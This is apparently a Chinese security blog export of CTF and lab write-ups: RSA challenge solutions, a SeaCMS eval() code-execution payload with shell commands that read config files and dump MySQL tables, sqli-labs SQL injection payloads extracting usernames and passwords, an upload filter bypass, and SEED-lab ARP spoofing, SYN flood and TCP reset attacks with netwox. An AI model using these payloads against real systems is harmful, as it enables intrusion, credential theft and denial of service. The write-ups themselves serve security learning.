    <content type="text"><![CDATA[0x00 复习密码学占个位置慢慢写 0x01 RSA密钥生成 题目 直接使用RSA-Tool 工具，因为p和q都是只有数字，所以猜测是十进制，修改右上角的Number Base为10，填入p，q，e（16进制），点击左下角的Cale.D生成密钥d 0x01 RSA解密 OpenSSL命令—rsautl 题目： 拿到一个zip包，用010Editor打开修改密码标记位，解压后有两个文件 发现imhere文件是私钥，flag是密文 所以解密命令： 1openssl rsautl -decrypt -in flag -inkey imhere -out a.txt 打开a.txt即可拿到flag 1key&#123;c42bcf773d54cf03&#125; 0x03 RSA破解https://github.com/ius/rsatool RSAtool之python版 gmpy2安装使用方法 如果kali上不了网，参考下面链接 https://blog.csdn.net/chenyanhui1087/article/details/53127884 注：不需要单独安装gmpy2，只要像下图直接pip install gmpy，pip会把其它依赖包一起装好 题目： 解题思路 只有公钥和密文，爆破公钥拿到 p，q，e，生成私钥，用私钥解密密文 解题过程 12345678910111213root@kali:~/Desktop# openssl rsa -pubin -text -modulus -in public.pem Public-Key: (256 bit)Modulus: 00:ca:00:f5:ed:7b:33:b9:bd:42:1e:77:31:8a:a1: 78:e7:5d:ed:e3:cb:1b:c7:d4:7a:7d:14:3b:e7:49: 1c:90:25Exponent: 65537 (0x10001)Modulus=CA00F5ED7B33B9BD421E77318AA178E75DEDE3CB1BC7D47A7D143BE7491C9025writing RSA key-----BEGIN PUBLIC KEY-----MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMoA9e17M7m9Qh53MYqheOdd7ePLG8fUen0UO+dJHJAlAgMBAAE=-----END PUBLIC KEY----- 按住shift + 鼠标右键 打开 windows powershell 12 .\msieve153.exe 0xCA00F5ED7B33B9BD421E77318AA178E75DEDE3CB1BC7D47A7D143BE7491C9025 -v 得到了，p，q，e，接下来我们要生成私钥了 1python rsatool.py -p 290579950064240059571837821251441436997 -q 314436328879392457343835667929324128609 -e 65537 -o pri.pem-f PEM 得到私钥后解密 1openssl rsautl -decrypt -in flag.enc -inkey pri.prm -out flag.txt flag: whalectf{256_n_get} 0x04 密码学—只有密文题目怎么办，已经截获了密文和模数n！能够破解吗？请分解出RSA中的两个大素数q和p。提交格式是key{x}x为两个素数中较小的那个的MD5前8位。 解题过程yafu安装使用方法以及mismatched parens解决方法 感谢小辣鸡的帮助(〃’▽’〃) 简单来说就是gcd遍历一遍，gcd（n，某密文） gcd（a,b）就是求a，b两个数之间的最大公约数 12345678910111213141516171819202122232425262728#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2018/5/10 21:13# @Author : Lhaihai# @File : 只有密文.py# @Software: PyCharm# @Blog : http://blog.Lhaihai.wang""" Description :"""n = 135176830582884945708175419898330054260341730432046991449072509302750602166218145078102928897914789996197402658592881347572949256377161172079344803330624352445165759925647345536051853372740246104804540179716136644319380454884518397455488002758429914465640804944658049262500561494830899678619427468784748988379def gcd(a, b): if b == 0: return a else: return gcd(b, a%b)print(gcd(10,5))x = open('E:\\CTF\蓝鲸安全\\第一周\\ciphertext.txt')for line in x.readlines(): if 'Ciphertext' in line: continue if len(line)&gt;2: print(gcd(n,int(line[:-1]))) 跑出来一个 113038371855775914836995578093728166671103633520203033965827703187246607207039273968425501296569317295959057439253867586769212037981452712871242668046329877 再算另外一个 110367615840240242845371941453623373821227053765532752994306127876946421006862147600725324340607889088707606730457021312059130583835286311559997627141422127 md5一下小的数 最后flag为 1key&#123;f49d7fe6&#125; DJ推荐了个刷密码学的网站：https://id0-rsa.pub/]]></content>
      <categories>
        <category>whalectf</category>
      </categories>
      <tags>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[百度杯CTF夺旗大赛9月场第三场Test]]></title>
    <url>%2F2018%2F05%2F06%2F%E7%99%BE%E5%BA%A6%E6%9D%AFCTF%E5%A4%BA%E6%97%97%E5%A4%A7%E8%B5%9B9%E6%9C%88%E5%9C%BA%E7%AC%AC%E4%B8%89%E5%9C%BATest%2F</url>
    <content type="text"><![CDATA[百度杯 九月场 Test 本地测试下载解压zip到www，访问upload 安装成功 构造playload 1search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[1]) 使用菜刀连接 看了一下search.php包含了common.php，根据common.php中的内容发现数据库的链接配置写在data/common.inc.php中。 用户名为root，密码为空，使用菜刀连接数据库 即可访问数据库 查询 sea_admin表，拿到管理员账号和密码 I春秋 CTF大本营环境尝试使用菜刀连接，但被安全狗过滤了 皮一下很开心，找到一篇使用命令的writeup，那就来吧。 11=$a = `cat data/common.inc.php` ; var_dump(a); 列当前目录下的文件 121=$a=`ls`;var_dump($a);1=$a=`ls \data`;var_dump($a); 1string(198) &quot;admin admin_d41d8cd98f00b204e9800998.php backupdata cache common.inc.php config.cache.bak.php config.cache.inc.php config.ftp.php config.ucenter.php config.user.inc.php cron.cache.php mark sessions &quot; 获取配置文件,因为是php代码所以在前端看不到，查看源代码就看到了 11=$a=`cat data/common.inc.php`;var_dump($a); ————————————源代码 获取数据库 11=$a=`mysql -usea_user -p46e06533407e -e &quot;show databases;&quot;`;var_dump($a); 1string(35) &quot;Database information_schema seacms &quot; 获取seacms数据库的表 11=$a=`mysql -usea_user -p46e06533407e -e &quot;show tables from seacms&quot;`;var_dump($a); 发现有个敏感表：flag_140ad2e0d8cb 1string(398) &quot;Tables_in_seacms flag_140ad2e0d8cb sea_admin sea_arcrank sea_buy sea_cck sea_co_cls sea_co_config sea_co_data sea_co_filters sea_co_news sea_co_type sea_co_url sea_comment sea_content sea_count sea_crons sea_data sea_erradd sea_favorite sea_flink sea_guestbook sea_jqtype sea_member sea_member_group sea_myad sea_mytag sea_news sea_playdata sea_search_keywords sea_tags sea_temp sea_topic sea_type &quot; 尝试从表中获取数据,然而被安全狗拦截了 11=$a=`mysql -usea_user -p46e06533407e -e &quot;select * from seacms.flag_140ad2e0d8cb&quot;`;var_dump($a); 手误试了下把*后面的空格去掉，没想到就拿到flag了 11=$a=`mysql -usea_user -p46e06533407e -e &quot;select *from seacms.flag_140ad2e0d8cb&quot;`;var_dump($a); 1string(48) &quot;flag flag&#123;2bb5a914-8009-476d-b90f-a0fac75d8567&#125; &quot; 方法二 11=system(&quot;mysql -usea_user -p46e06533407e -e &apos;select *from seacms.flag_140ad2e0d8cb&apos;&quot;); 方法三 直接绕过貌似比较难，于是先将payload使用base6编码。用两个eval绕过waf的拦截。最后构造的payload如下: 方法四 参考链接Seacms漏洞分析利用复现 By Assassin “百度杯”CTF比赛 九月场Test 海洋cms前台直接GetShell]]></content>
      <categories>
        <category>Web安全</category>
        <category>I春秋</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[kali 2.0下安装 metasploit]]></title>
    <url>%2F2018%2F05%2F05%2F2-0%E4%B8%8B%E5%AE%89%E8%A3%85metasploit%2F</url>
    <content type="text"><![CDATA[github地址 第一步:kali linux 2.0 本身已内置metasploit，kali 2.0 已经没有metasploit 这个服务了，所以service metasploit start 的方式不起作用。 在kali 2.0中启动带数据库支持的msf方式如下： 123456#1 首先启动postgresql数据库：/etc/init.d/postgresql start；或者 service postgresql start；#2 初始化MSF数据库（关键步骤！）：msfdb init；#3 运行msfconsole：msfconsole；#4 在msf中查看数据库连接状态：db_status。DONEdb_rebuild_cache 过程如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136root@kali:~# service metasploit startFailed to start metasploit.service: Unit metasploit.service not found.root@kali:~# service postgresql startroot@kali:~# msfdb init[i] Database already started[+] Creating database user &apos;msf&apos;[+] Creating databases &apos;msf&apos;[+] Creating databases &apos;msf_test&apos;[+] Creating configuration file &apos;/usr/share/metasploit-framework/config/database.yml&apos;[+] Creating initial database schemaroot@kali:~# msfconsole , , / \ ((__---,,,---__)) (_) O O (_)_________ \ _ / |\ o_o \ M S F | \ \ _____ | * ||| WW||| ||| ||| =[ metasploit v4.16.52-dev ]+ -- --=[ 1754 exploits - 1006 auxiliary - 306 post ]+ -- --=[ 536 payloads - 41 encoders - 10 nops ]+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]msf &gt; db_status[*] postgresql connected to msfmsf &gt; DONE[-] Unknown command: DONE.msf &gt; db_rebuild_cache [*] Purging and rebuilding the module cache in the background...msf &gt; helpCore Commands============= Command Description ------- ----------- ? Help menu banner Display an awesome metasploit banner cd Change the current working directory color Toggle color connect Communicate with a host exit Exit the console get Gets the value of a context-specific variable getg Gets the value of a global variable grep Grep the output of another command help Help menu history Show command history irb Drop into irb scripting mode load Load a framework plugin quit Exit the console route Route traffic through a session save Saves the active datastores sessions Dump session listings and display information about sessions set Sets a context-specific variable to a value setg Sets a global variable to a value sleep Do nothing for the specified number of seconds spool Write console output into a file as well the screen threads View and manipulate background threads unload Unload a framework plugin unset Unsets one or more context-specific variables unsetg Unsets one or more global variables version Show the framework and console library version numbersModule Commands=============== Command Description ------- ----------- advanced Displays advanced options for one or more modules back Move back from the current context edit Edit the current module or a file with the preferred editor info Displays information about one or more modules loadpath Searches for and loads modules from a path options Displays global options or for one or more modules popm Pops the latest module off the stack and makes it active previous Sets the previously loaded module as the current module pushm Pushes the active or list of modules onto the module stack reload_all Reloads all modules from all defined module paths reload_lib Load a library file from specified path search Searches module names and descriptions show Displays modules of a given type, or all modules use Selects a module by nameJob Commands============ Command Description ------- ----------- handler Start a payload handler as job jobs Displays and manages jobs kill Kill a job rename_job Rename a jobResource Script Commands======================== Command Description ------- ----------- makerc Save commands entered since start to a file resource Run the commands stored in a fileDatabase Backend Commands========================= Command Description ------- ----------- db_connect Connect to an existing database db_disconnect Disconnect from the current database instance db_export Export a file containing the contents of the database db_import Import a scan result file (filetype will be auto-detected) db_nmap Executes nmap and records the output automatically db_rebuild_cache Rebuilds the database-stored module cache db_status Show the current database status hosts List all hosts in the database loot List all loot in the database notes List all notes in the database services List all services in the database vulns List all vulnerabilities in the database workspace Switch between database workspacesCredentials Backend Commands============================ Command Description ------- ----------- creds List all credentials in the database]]></content>
      <tags>
        <tag>kali linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql_labs学习记录（1）]]></title>
    <url>%2F2018%2F05%2F05%2Fsql-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%881%EF%BC%89%2F</url>
    <content type="text"><![CDATA[less 1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)1http://localhost/sqli-labs-master/Less-1/?id=15&apos; union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=database() -- + 不选择数据库的话它会把很多个users表的字段爆出来 1http://localhost/sqli-labs-master/Less-1/?id=15&apos; union select 1,group_concat(column_name) ,3 from information_schema.columns where table_name=&apos;users&apos; -- + 1http://localhost/sqli-labs-master/Less-1/?id=15&apos; union select 1,group_concat(column_name) ,3 from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; -- + 1http://localhost/sqli-labs-master/Less-1/?id=15&apos; union select 1,group_concat(concat_ws(&apos;_&apos;,id,username,password)) ,3 from users -- + less 2 GET - Error based - Intiger based (基于错误的GET整型注入) 12345678http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,concat_ws(char(32,58,32),database(),user(),version()),3 -- http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=database() -- http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,group_concat(concat_ws(char(32,58,32),id,username,password)) ,3 from users -- Less 3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)12345678http://localhost/sqli-labs-master/Less-3/?id=1.1&apos;) union select 1,group_concat(database(),version()),3 -- +?id=1.1&apos;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = database() -- +?id=1.1&apos;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name = &apos;users&apos; and table_schema = database() -- +?id=1.1&apos;) union select 1,group_concat(concat_ws(char(32,58,32),id,username,password)),3 from users -- + less 4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）1?id=1.1&quot;) union select 1,group_concat(concat_ws(char(32,58,32),id,username,password)),3 from users -- + less 5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)12345678910111213141516?id=1&apos; union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a%23 查表?id=1&apos; union select count(*),count(*), concat((select table_name from information_schema.tables where table_schema = database() limit 0, 1), floor(rand()*2)) as a from information_schema.tables group by a%23 ?id=1&apos; union select count(*),count(*), concat((select table_name from information_schema.tables where table_schema = database() limit 3, 1), floor(rand()*2)) as a from information_schema.tables group by a%23 查列?id=1&apos; union select count(*),count(*), concat((select column_name from information_schema.columns where table_schema = database() and table_name = &apos;users&apos; limit 0, 1), floor(rand()*2)) as a from information_schema.tables group by a%23 ?id=1&apos; union select count(*),count(*), concat((select column_name from information_schema.columns where table_schema = database() and table_name = &apos;users&apos; limit 1, 1), floor(rand()*2)) as a from information_schema.tables group by a%23 ?id=1&apos; union select count(*),count(*), concat((select column_name from information_schema.columns where table_schema = database() and table_name = &apos;users&apos; limit 2, 1), floor(rand()*2)) as a from information_schema.tables group by a%23 查数据?id=1&apos; union select count(*),count(*), concat((select username from users limit 0, 1), floor(rand()*2)) as a from information_schema.tables group by a%23 less 6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)1?id=1&quot; union select count(*),count(*), concat((select username from users limit 0, 1), floor(rand()*2)) as a from information_schema.tables group by a%23 less 7 GET - Dump into outfile - String （导出文件GET字符型注入）less 8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)参考链接: 通过sqli-labs学习sql注入——基础挑战之less1-10 sqli-labs学习记录（三） sqli-labs学习记录（四）]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[百度杯CTF夺旗大赛9月场第二场SQL]]></title>
    <url>%2F2018%2F05%2F02%2F%E7%99%BE%E5%BA%A6%E6%9D%AFCTF%E5%A4%BA%E6%97%97%E5%A4%A7%E8%B5%9B9%E6%9C%88%E5%9C%BA%E7%AC%AC%E4%BA%8C%E5%9C%BASQL%2F</url>
    <content type="text"><![CDATA[首先看看是否有字符过滤把所有字符串都试一遍 1/index.php?id = 1~!@$%^&amp;*()_+-=&#123;&#125;[]&apos;&quot;;&lt;&gt;/? 发现&lt;&gt;直接被删除，即是：sele&lt;&gt;ct --&gt; select符号+被替换为空格等等 获取当前表的字段个数：1?id=1 ord&lt;&gt;er by 3 正常返回 联合注入，获取可以显示的字段1?id=1 uni&lt;&gt;on sel&lt;&gt;ect 1,2,3 执行之后，第二个字段被显示出来，说明三个字段只有第二个字段可以显示。 爆表名1?id=1 union selec&lt;&gt;t 1,group_concat(table_name),3 from information_schema.tables where table_schema =database() 爆出 info 表 爆列名1?id=1 union selec&lt;&gt;t 1,group_concat(column_name),3 from information_schema.columns where table_name= &apos;info&apos; 1id,title,flAg_T5ZNdrm 爆flag1?id=1 union selec&lt;&gt;t 1,group_concat(flAg_T5ZNdrm),3 from info flag 1flag&#123;1d80a990-37a8-48e2-9fd5-a4de39cbcf60&#125;,test 参考链接https://www.cnblogs.com/wangleiblog/p/5924451.html sql注入字符绕过方法： sql注入实例一枚：]]></content>
      <categories>
        <category>Web安全</category>
        <category>I春秋</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[红帽杯Web-simple_upload]]></title>
    <url>%2F2018%2F05%2F02%2F%E7%BA%A2%E5%B8%BD%E6%9D%AFWeb-simple-upload%2F</url>
    <content type="text"><![CDATA[simple upload这次在你面前的网站的功能非常简单，接受挑战吧！ 0x01 抓包发现admin=0，改为1登录 0x02 文件上传只要把Content-Type 改为image/jpeg就可以绕过 0x03 上传木马测试了php，asp都不行，最后用jsp 在根目录发现flag，下载 Jsp webshell:https://github.com/dingody/jspy 一句话木马和中国菜刀的结合拿webshell 2016年11月整理的最新php免杀一句话木马, 2017php免杀一句话(php过狗一句话,过狗菜刀,2016过狗一句话,2016php免杀一句话,php过waf一句话) 整理的最新WebSHell (php过狗一句话,过狗菜刀,2016过狗一句话,2016php免杀一句话)]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>upload</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TCP/IP]]></title>
    <url>%2F2018%2F05%2F01%2FTCP-IP%2F</url>
    <content type="text"><![CDATA[TCP/IP SEEDUbuntu A号 ip12345678910111213141516171819[03/30/2018 23:42] seed@ubuntu:~$ ifconfigeth0 Link encap:Ethernet HWaddr 00:0c:29:2a:28:90 inet addr:192.168.100.136 Bcast:192.168.100.255 Mask:255.255.255.0 inet6 addr: fe80::20c:29ff:fe2a:2890/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:887 errors:0 dropped:0 overruns:0 frame:0 TX packets:634 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:136676 (136.6 KB) TX bytes:74886 (74.8 KB) Interrupt:19 Base address:0x2000 lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:16436 Metric:1 RX packets:60 errors:0 dropped:0 overruns:0 frame:0 TX packets:60 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:5659 (5.6 KB) TX bytes:5659 (5.6 KB) SEEDUbuntu B号 ip12345678910111213141516171819[03/31/2018 01:22] seed@ubuntu:~$ ifconfigeth0 Link encap:Ethernet HWaddr 00:0c:29:79:62:d3 inet addr:192.168.100.137 Bcast:192.168.100.255 Mask:255.255.255.0 inet6 addr: fe80::20c:29ff:fe79:62d3/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:361 errors:0 dropped:0 overruns:0 frame:0 TX packets:271 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:84607 (84.6 KB) TX bytes:37560 (37.5 KB) Interrupt:19 Base address:0x2000 lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:16436 Metric:1 RX packets:35 errors:0 dropped:0 overruns:0 frame:0 TX packets:35 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:3397 (3.3 KB) TX bytes:3397 (3.3 KB) Kali Linux ip123456789101112131415161718root@kali:~# ifconfigeth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 192.168.100.135 netmask 255.255.255.0 broadcast 192.168.100.255 inet6 fe80::20c:29ff:fe8d:a7b0 prefixlen 64 scopeid 0x20&lt;link&gt; ether 00:0c:29:8d:a7:b0 txqueuelen 1000 (Ethernet) RX packets 65 bytes 4574 (4.4 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 25 bytes 2319 (2.2 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10&lt;host&gt; loop txqueuelen 1000 (Local Loopback) RX packets 20 bytes 1116 (1.0 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 20 bytes 1116 (1.0 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 Task (1) : ARP cache poisoning 实验原理ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。 攻击者向电脑A发送一个伪造的ARP响应，告诉电脑A：电脑B的IP地址192.168.0.2对应的MAC地址是00-aa-00-62-c6-03，电脑A信以为真，将这个对应关系写入自己的ARP缓存表中，以后发送数据时，将本应该发往电脑B的数据发送给了攻击者。同样的，攻击者向电脑B也发送一个伪造的ARP响应，告诉电脑B：电脑A的IP地址192.168.0.1对应的MAC地址是00-aa-00-62-c6-03，电脑B也会将数据发送给攻击者。 netwox 80 –help12345678910111213[03/31/2018 01:16] root@ubuntu:/home/seed# netwox 80 --helpTitle: Periodically send ARP repliesUsage: netwox 80 -e eth -i ip [-d device] [-E eth] [-I ip] [-s uint32]Parameters: -e|--eth eth ethernet address &#123;00:0C:29:2A:28:90&#125; -i|--ip ip IP address &#123;192.168.100.136&#125; -d|--device device device for spoof &#123;Eth0&#125; -E|--eth-dst eth to whom answer &#123;0:8:9:a:b:c&#125; -I|--ip-dst ip to whom answer &#123;5.6.7.8&#125; -s|--sleep uint32 sleep delay in ms &#123;1000&#125; --help2 display full helpExample: netwox 80 -e &quot;00:0C:29:2A:28:90&quot; -i &quot;192.168.100.136&quot;Example: netwox 80 --eth &quot;00:0C:29:2A:28:90&quot; --ip &quot;192.168.100.136&quot; fping -g 192.168.100.1/24 arpspoof 被欺骗主机 https://www.cnblogs.com/rebrust/p/6096101.html Task (2) : ICMP Redirect Attack （1）实验原理ICMP重定向攻击ICMP重定向信息是路由器向主机提供实时的路由信息，当一个主机收到ICMP重定向信息时，它就会根据这个信息来更新自己的路由表。由于缺乏必要的合法性检查，如果一个黑客想要被攻击的主机修改它的路由表，黑客就会发送ICMP重定向信息给被攻击的主机，让该主机按照黑客的要求来修改路由表。 （2）安装 traceroute1sudo apt-get install traceroute 三台主机都可以traceroute到外网，如traceroute百度的时候，经过的第一个路由器是192.168.100.2 （3）为了让主机A能够正常转发数据包，需要对主机A进行如下设置：1sudo sysctl -w net.ipv4.ip_forward=1 （4）使用netwox86号工具可以完成这个攻击1netwox 86 -f &quot;host 192.168.100.137&quot; -g &quot;192.168.100.136&quot; -i &quot;192.168.100.2&quot; 顺序第一个IP是被攻击者IP，第二个是攻击者IP，第三个是路由器IP （5）然后克隆机再次traceroute，第一次经过的路由是 Task 3 : SYN Flooding Attack 1netstat -na netstat -na 来显示所有连接的端口并用数字表示. https://linux.cn/article-2434-1.html https://blog.csdn.net/thanklife/article/details/55193248 https://blog.csdn.net/yes_angel/article/details/46773073 实验原理TCP SYN泛洪发生在OSI第四层，这种方式利用TCP协议的特性，就是三次握手。攻击者发送TCP SYN，SYN是TCP三次握手中的第一个数据包，而当服务器返回ACK后，该攻击者就不对其进行再确认，那这个TCP连接就处于挂起状态，也就是所谓的半连接状态，服务器收不到再确认的话，还会重复发送ACK给攻击者。这样更加会浪费服务器的资源。攻击者就对服务器发送非常大量的这种TCP连接，由于每一个都没法完成三次握手，所以在服务器上，这些TCP连接会因为挂起状态而消耗CPU和内存，最后服务器可能死机，就无法为正常用户提供服务了。 netwox 76 –help12345678910[03/30/2018 23:47] seed@ubuntu:~$ netwox 76 --helpTitle: SynfloodUsage: netwox 76 -i ip -p port [-s spoofip]Parameters: -i|--dst-ip ip destination IP address &#123;5.6.7.8&#125; -p|--dst-port port destination port number &#123;80&#125; -s|--spoofip spoofip IP spoof initialization type &#123;linkbraw&#125; --help2 display full helpExample: netwox 76 -i &quot;5.6.7.8&quot; -p &quot;80&quot;Example: netwox 76 --dst-ip &quot;5.6.7.8&quot; --dst-port &quot;80&quot; 当输入 netwox 76 命令时，提示错误 1234[03/30/2018 23:50] seed@ubuntu:~$ netwox 76 -i &quot;192.168.100.135&quot; -p &quot;80&quot;Error 3002 : not supported hint: errno = 19 = No such device hint: libnet_init(): UID or EUID of 0 required 这是因为它需要管理员权限，su 123[03/30/2018 23:59] seed@ubuntu:~$ suPassword: [03/30/2018 23:59] root@ubuntu:/home/seed# 这时候可以使用netwox 76 泛洪攻击了 第二次： 关闭SYN Cookie123# sysctl -a | grep cookie (Display the SYN cookie flag)# sysctl -w net.ipv4.tcp_syncookies=0 (turn off SYN cookie)# sysctl -w net.ipv4.tcp_syncookies=1 (turn on SYN cookie) 123456root@kali:~# sysctl -a | grep cookiesysctl: reading key &quot;net.ipv6.conf.all.stable_secret&quot;sysctl: reading key &quot;net.ipv6.conf.default.stable_secret&quot;sysctl: reading key &quot;net.ipv6.conf.eth0.stable_secret&quot;sysctl: reading key &quot;net.ipv6.conf.lo.stable_secret&quot;net.ipv4.tcp_syncookies = 1 Task 4: TCP RST Attacks on telnet and ssh Connections 实验原理TCP头部中有一位被称为”reset flag”，如果接收到该位置为1的TCP报文，则计算机应该立即结束该TCP连接。造成这种攻击的原因与SYN洪泛有类似之处，就是网络层、传输层对于伪造的数据包并没有鉴别能力。 netwox 78 –help123456789[03/31/2018 00:19] root@ubuntu:/home/seed# netwox 78 --helpTitle: Reset every TCP packetUsage: netwox 78 [-d device] [-f filter] [-s spoofip]Parameters: -d|--device device device name &#123;Eth0&#125; -f|--filter filter pcap filter -s|--spoofip spoofip IP spoof initialization type &#123;linkbraw&#125; --help2 display help for advanced parametersExample: netwox 78 （1）建立A号和B号的telnet连接 （2）B号机发现23号端口被占用，建立起了连接 （3）kali主机进行攻击 （4）返回A号机发现连接断开（回车一下） （5）B号机的23号端口不被占用 （6）A号机尝试继续连接，连接不上。注意，此时kali的攻击并没有停止。 （7）SSH进行同样的测试 Task (5) : TCP RST Attacks on Video Streaming Applications. 打开一个视频 发起攻击 A号机已经连接不上视频+ Task (6) : ICMP Blind Connection-Reset and Source-Quench Attacks 实验原理ICMP信息同样可以被用于达成连接重置攻击。为了达到这个目的，攻击者发送一条显示“硬错误”的ICMP的错误信息给TCP连接两端的任意一方。连接将会被立即中断，因为在RFC1122中主机在接收到这样一个TCMP错误包时，应当立即中断相关的连接。RFC1122定义“硬错误”为一个目的不可达且协议无效、端口无效、标志位缺失和DF位设置的ICMP错误信息 ICMP源端关闭信息被拥塞路由器用于告知TCP发送者减缓发送包的速度。攻击者可以制定这样的信息来实施对TCP发送者的拒绝服务攻击。 12345678910root@kali:~# netwox 82 --helpTitle: Sniff and send ICMP4/ICMP6 destination unreachableUsage: netwox 82 [-d device] [-f filter] [-c uint32] [-i ip]Parameters: -d|--device device device name &#123;Eth0&#125; -f|--filter filter pcap filter -c|--code uint32 ICMP code &#123;0&#125; -i|--src-ip ip source IP address &#123;192.168.100.138&#125; --help2 display help for advanced parametersExample: netwox 82 （1）A和B建立telnet连接 （2）kali主机进行攻击 可以发现A收到了攻击，但是无效 出现这种情况的原因可能是在高版本的ubuntu中已经制订了一些策略来防止这些攻击。 Task (7) : TCP Session Hijacking 实验原理TCP会话劫持攻击，是劫持通信双方已建立的TCP会话连接，假冒其中一方的身份与另一方进行进一步通信。通常一些网络服务会建立在TCP会话之后进行应用层的身份认证，客户端在通过身份认证之后，就可以通过TCP会话连接对服务器索取资源。且期间不用再次进行身份认证。而TCP会话劫持为 攻击者提供了一种绕过应用层身份认证的技术途径，因此得到较高水平攻击者的青睐。 （1）安装hunt 1sudo apt-get install hunt (2)A和B建立连接 （2）kali可以监听到A和B的telnet会话 （3）然后运行hunt，却发现hunt发现不了telnet连接，只能用netwox 40 找到最后一个数据包 过程很痛苦，总之都失败了]]></content>
      <tags>
        <tag>TCP,IP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Upload]]></title>
    <url>%2F2018%2F04%2F30%2FUpload%2F</url>
    <content type="text"><![CDATA[第一届“百度杯”信息安全攻防总决赛 线上选拔赛 题目内容：来来来，都是套路，贼简单。 过程 抓包分析一波，看来就是写脚本base64解码响应报头的flag，post上去 12345678910111213141516171819202122232425262728#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2018/4/30 22:46# @Author : Lhaihai# @File : fastman.py# @Software: PyCharm# @Blog : http://blog.Lhaihai.wang""" Description :第一届“百度杯”信息安全攻防总决赛 线上选拔赛 题目名称：Upload 题目内容：来来来，都是套路，贼简单。"""import base64import requestsurl='http://b495ad3915ae4a38b4c2598b19c1d99ca7f3058e9c154524.game.ichunqiu.com/'session = requests.session()r = session.get(url)temp = str(base64.b64decode(r.headers['flag'])).split(':')flag = temp[1][1:-1]print(flag)flag2 = base64.b64decode(temp[1])print(flag2)datas=&#123; 'ichunqiu':flag2&#125;r = session.post(url,data=datas)print(r.text) 没想到flag要base64解码两次， 拿到path， 访问：题目给的url+path 点Webcome，下滑出现登录表单 又是md5截断 12345678910111213141516171819202122#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2018/4/30 23:06# @Author : Lhaihai# @File : md5截断.py# @Software: PyCharm# @Blog : http://blog.Lhaihai.wang""" Description :"""import hashlibdef md5(s): return hashlib.md5(str(s).encode('utf-8')).hexdigest()def main(s): for i in range(99999999): if(md5(i)[0:6] == str(s)): print(i) exit(0)if __name__ == '__main__': main('9ea8da') 但是我们还不知道用户名和密码 挂目录扫描器一扫，发现有svn源码泄露， 访问访问 URL+/xxxx/.svn/wc.db (SVN 源码泄露漏洞) 即可获得username is md5(HEL1OW10rDEvery0n3) wc.db是固定的，只能说多多积累经验了 123username：8638d5263ab0d3face193725c23ce095password: 123456captcha : xxx 登录有弹窗 访问 xxxxxx.php 上传个图片，大小写不行，加个空格不行，那就试试1,2,3,4,5，也不行，最后试试pht,phtml 终于成了 后来发现一位大哥的md5截断，随机来，记录一下 1234567891011121314import randomimport stringdef md5(str): import hashlib m = hashlib.md5() m.update(str) return m.hexdigest()while 1: string = '' s = string.join(random.sample('qwertyuiopasdfghjklzxcvbnm1234567890',4)) if md5(s)[0:6] == 'e63f44': print s break #substr(md5($str), 0, 6) ===]]></content>
      <categories>
        <category>Web安全</category>
        <category>I春秋</category>
      </categories>
      <tags>
        <tag>upload</tag>
      </tags>
  </entry>
  <entry>
